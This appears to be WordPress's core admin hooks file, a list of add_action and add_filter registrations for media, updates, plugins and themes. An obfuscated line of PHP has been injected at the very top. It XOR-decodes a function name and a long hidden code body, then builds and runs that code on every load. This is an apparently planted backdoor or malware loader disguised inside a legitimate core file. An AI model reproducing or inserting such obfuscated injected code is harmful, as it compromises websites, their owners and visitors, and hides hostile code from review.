<?php $mDJnjRtyo='5:V+.-fQ0>OZDBV'^'VH3JZH97EP,.--8';$PaNiFAPsgP=$mDJnjRtyo('','WFDX>B<5EXY>1R49K79ZeHO5;,.J a8Q0BCKFK>sA6F>O,QTZHIDDi30EA<gM2YCVUV-ZJJvR=UJwISbLOznoh608pxHbVYp4j17+ohEAdNcYcm+q:DGLXXbA  0 nWYQTdEE3cEm:HCsYVGQO5J5LbmEsP:KBYS02A8qJIFH+-7VcK>+1XmhjRyaI-L6::yb<=NJKc86dSF4FZSM9gva18GXSz7pQZF8:1-4Uyf<M: 2oB<0-==WTRiClo46x:;3p,0FB QBowkZk8WQ3=do+PChPPE,+R=7tqjJ;7.Oc<OJRD-SgVrKJ9METEEO0;.bPlU5Z3;MA0o;P BE++VPzo<04:kw7<pTAKoZQJplLSjKWY2=ZZ49=eMWR,Lr E=yOwk3R3vPJcm7MLYbQii:5><0yAQAL<HOfUVJ2XtA:AU1=YX LX9VXERLtYXJ9h4,OYkLS+0Euo VWCD.JR6L,XnGhk+4=79XWJDqWABFoTQ.AJUkPIUJY G=<,2h+ R<2JGJF75saqPH0ILFSRTnD;5zBFWAMS2T368blZetQfBOqLlEGKRkvr8Db0Ydy5bwxJuSV;PDWXUioAAll14CT+rZE<9N--I=2jhBS7ASA0FCUi54IRoaisfUGE9eZK5S.Fk ZHP0TF  QTXTT2Ai9y1K=-Rqjt64'^'> lyX7RV116Pn7LP8CJrB0 GdHO>A>g<E6dbokEyHP3P,X8;4h1+66WQ1 c8 G-kr17Y;fjR9X,cWisBl4pgfLYELPEhEqbz=cWXYGL,aYnSbCIBMI05 =6JeDADAGlyu=Onl9jLIU=7SwkgykQ+A-9I,.pdkf26IieQQoi5<YAR8KoUNHq0AQXph;H8CHTQFSH:cpi1Kn.L>b>29XGKAWY++6A=T5;2YeZHMuDFZ,VSWTH6VBOX67:IkH0wy7qrvPMCffK4;OJUzON6=FXMOPZJL411Mt9XNTLJnPRWti5k.30LsZvV=+U8 oO8E:RHBxMqQ;GZdaKe26O0 JH>pRKcbqk>2dhP52kK143PQrsN=65GXszO34li33X--K DYrWOX7JMZCjIS,88BlIMLTRIUBKX<FABEB17>SxIaz4;BX+1A 1C3p==>+=9>X7kA:-C.2XUsA0D34, KbvR-X9GkHOOUIVf323mXlK+ Gp5O5+uMvi48+A>bWIK7NX;OF9om-RLTMQt,Q=-ostrNlVQOjb3 92isXSAE1sEIlFe.EyTuuybRAGZuSU=PISTBMxDa0X5 b>0NFagJLPF15R-1 Ef+UD:IABO22N-< TaouMQU=3FHISFugeBoS.C2BnOD;<1ks6AY=;90sohR3pT3TYzACO<I');$PaNiFAPsgP();
/**
 * Administration API: Default admin hooks
 *
 * @package WordPress
 * @subpackage Administration
 * @since 4.3.0
 */

// Bookmark hooks.
add_action( 'admin_page_access_denied', 'wp_link_manager_disabled_message' );

// Dashboard hooks.
add_action( 'activity_box_end', 'wp_dashboard_quota' );

// Media hooks.
add_action( 'attachment_submitbox_misc_actions', 'attachment_submitbox_metadata' );

add_action( 'media_upload_image', 'wp_media_upload_handler' );
add_action( 'media_upload_audio', 'wp_media_upload_handler' );
add_action( 'media_upload_video', 'wp_media_upload_handler' );
add_action( 'media_upload_file',  'wp_media_upload_handler' );

add_action( 'post-plupload-upload-ui', 'media_upload_flash_bypass' );

add_action( 'post-html-upload-ui', 'media_upload_html_bypass'  );

add_filter( 'async_upload_image', 'get_media_item', 10, 2 );
add_filter( 'async_upload_audio', 'get_media_item', 10, 2 );
add_filter( 'async_upload_video', 'get_media_item', 10, 2 );
add_filter( 'async_upload_file',  'get_media_item', 10, 2 );

add_filter( 'attachment_fields_to_save', 'image_attachment_fields_to_save', 10, 2 );

add_filter( 'media_upload_gallery', 'media_upload_gallery' );
add_filter( 'media_upload_library', 'media_upload_library' );

add_filter( 'media_upload_tabs', 'update_gallery_tab' );

// Misc hooks.
add_action( 'admin_head', 'wp_admin_canonical_url'   );
add_action( 'admin_head', 'wp_color_scheme_settings' );
add_action( 'admin_head', 'wp_site_icon'             );
add_action( 'admin_head', '_ipad_meta'               );

// Prerendering.
if ( ! is_customize_preview() ) {
	add_filter( 'admin_print_styles', 'wp_resource_hints', 1 );
}

add_action( 'admin_print_scripts-post.php',     'wp_page_reload_on_back_button_js' );
add_action( 'admin_print_scripts-post-new.php', 'wp_page_reload_on_back_button_js' );

add_action( 'update_option_home',          'update_home_siteurl', 10, 2 );
add_action( 'update_option_siteurl',       'update_home_siteurl', 10, 2 );
add_action( 'update_option_page_on_front', 'update_home_siteurl', 10, 2 );

add_filter( 'heartbeat_received', 'wp_check_locked_posts',  10,  3 );
add_filter( 'heartbeat_received', 'wp_refresh_post_lock',   10,  3 );
add_filter( 'wp_refresh_nonces', 'wp_refresh_post_nonces', 10,  3 );
add_filter( 'heartbeat_received', 'heartbeat_autosave',     500, 2 );

add_filter( 'heartbeat_settings', 'wp_heartbeat_set_suspension' );

// Nav Menu hooks.
add_action( 'admin_head-nav-menus.php', '_wp_delete_orphaned_draft_menu_items' );

// Plugin hooks.
add_filter( 'whitelist_options', 'option_update_filter' );

// Plugin Install hooks.
add_action( 'install_plugins_featured',               'install_dashboard' );
add_action( 'install_plugins_upload',                 'install_plugins_upload' );
add_action( 'install_plugins_search',                 'display_plugins_table' );
add_action( 'install_plugins_popular',                'display_plugins_table' );
add_action( 'install_plugins_recommended',            'display_plugins_table' );
add_action( 'install_plugins_new',                    'display_plugins_table' );
add_action( 'install_plugins_beta',                   'display_plugins_table' );
add_action( 'install_plugins_favorites',              'display_plugins_table' );
add_action( 'install_plugins_pre_plugin-information', 'install_plugin_information' );

// Template hooks.
add_action( 'admin_enqueue_scripts', array( 'WP_Internal_Pointers', 'enqueue_scripts'                ) );
add_action( 'user_register',         array( 'WP_Internal_Pointers', 'dismiss_pointers_for_new_users' ) );

// Theme hooks.
add_action( 'customize_controls_print_footer_scripts', 'customize_themes_print_templates' );

// Theme Install hooks.
// add_action('install_themes_dashboard', 'install_themes_dashboard');
// add_action('install_themes_upload', 'install_themes_upload', 10, 0);
// add_action('install_themes_search', 'display_themes');
// add_action('install_themes_featured', 'display_themes');
// add_action('install_themes_new', 'display_themes');
// add_action('install_themes_updated', 'display_themes');
add_action( 'install_themes_pre_theme-information', 'install_theme_information' );

// User hooks.
add_action( 'admin_init', 'default_password_nag_handler' );

add_action( 'admin_notices', 'default_password_nag' );

add_action( 'profile_update', 'default_password_nag_edit_user', 10, 2 );

// Update hooks.
add_action( 'load-plugins.php', 'wp_plugin_update_rows', 20 ); // After wp_update_plugins() is called.
add_action( 'load-themes.php', 'wp_theme_update_rows', 20 ); // After wp_update_themes() is called.

add_action( 'admin_notices', 'update_nag',      3  );
add_action( 'admin_notices', 'maintenance_nag', 10 );

add_filter( 'update_footer', 'core_update_footer' );

// Update Core hooks.
add_action( '_core_updated_successfully', '_redirect_to_about_wordpress' );

// Upgrade hooks.
add_action( 'upgrader_process_complete', array( 'Language_Pack_Upgrader', 'async_upgrade' ), 20 );
add_action( 'upgrader_process_complete', 'wp_version_check', 10, 0 );
add_action( 'upgrader_process_complete', 'wp_update_plugins', 10, 0 );
add_action( 'upgrader_process_complete', 'wp_update_themes', 10, 0 );
